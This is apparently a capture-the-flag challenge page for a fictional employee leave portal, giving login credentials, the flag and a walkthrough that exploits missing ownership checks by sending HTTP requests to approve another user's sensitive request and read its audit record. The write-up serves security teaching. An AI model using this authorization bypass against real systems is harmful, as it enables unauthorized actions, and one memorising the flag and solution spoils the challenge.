# Locked Approval

## Description:

An internal employee portal manages leave requests.

You have access to the system as a regular employee. Everything seems normal, but something doesn't quite add up.

**Credentials**

- Username: `employee01`
- Password: `leave2026`

Investigate the application carefully and find what shouldn't be accessible to you.

## Flag: BTWCTF{approval_receipt_7f3c91d2a84e6b5f}

## Solution: 
### Solution

1. Log in as the normal employee using:

```json
{
  "username": "employee01",
  "password": "leave2026"
}
```

2. The dashboard reveals request IDs `1042` and `1043`.

3. Notice that request `1043` belongs to `hr_manager` and is marked as sensitive.

4. The approval endpoint does not check ownership or role. Send:

```http
POST /api/requests/1043/approve
x-user: employee01
```

5. The request is approved even though `employee01` is not authorized to approve it.

6. Access the audit endpoint:

```http
GET /api/audit/1043
x-user: employee01
```

7. Since the request is now approved and sensitive, the response contains the flag in `approvalToken`.

8. Retrieve the flag.

